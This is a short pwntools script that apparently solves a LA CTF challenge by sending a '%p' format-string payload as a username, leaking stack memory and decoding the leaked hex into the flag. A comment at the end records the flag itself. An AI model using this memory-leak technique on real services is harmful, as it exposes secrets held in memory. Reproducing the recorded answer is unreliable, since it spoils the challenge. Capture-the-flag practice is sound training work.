from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./chall', '''
#     b main
#     continue
# ''')

p = remote('chall.lac.tf', 31142)

p.sendlineafter(b'username: ', b"%p%p%p%p%p%p%p%p")
p.sendlineafter(b'password1: ', b"\n")
p.sendlineafter(b'password2: ', b"\n")

p.recvuntil(b'user ')
value = p.recvuntil(b'\n').decode().strip()
hex_flag = [
    int(value[-52:-34], 16),
    int(value[-34:-16], 16),
    int(value[-16:], 16)
]

flag = ""
for hex_flag_part in hex_flag:
    hex_bytes = hex_flag_part.to_bytes((hex_flag_part.bit_length() + 7) // 8, byteorder='little')
    ascii_str = hex_bytes.decode('ascii')
    flag += ascii_str
print(flag)

p.interactive()

# lactf{hunter2_cfc0xz68}
